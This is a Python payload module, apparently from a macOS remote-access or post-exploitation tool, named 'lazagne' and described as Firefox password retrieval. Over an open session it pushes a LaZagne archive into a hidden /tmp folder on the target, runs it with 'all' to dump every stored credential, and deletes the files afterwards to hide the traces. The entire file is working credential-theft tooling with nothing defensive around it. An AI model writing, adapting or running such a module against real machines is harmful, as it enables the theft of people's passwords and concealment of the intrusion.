import modules
import os
class payload:
    def __init__(self):
        self.name = "lazagne"
        self.description = "firefox password retrieval | (https://github.com/AlessandroZ/LaZagne/wiki)"
        self.type = "custom"
        self.id = 128
    
    def run(self,session,server,command):
        server.uploadFile("src/resources/lazagne_macos.zip","/tmp/.lazagne_macos.zip",session.conn)
        payload = "/tmp/.lazagne_macos.zip -d /tmp/.lazagne >/dev/null;rm /tmp/.lazagne_macos.zip;python /tmp/.lazagne/lazagne.py all;rm -rf /tmp/.lazagne"
        result = server.sendCommand("unzip",payload,"shell",session.conn)
        return ""
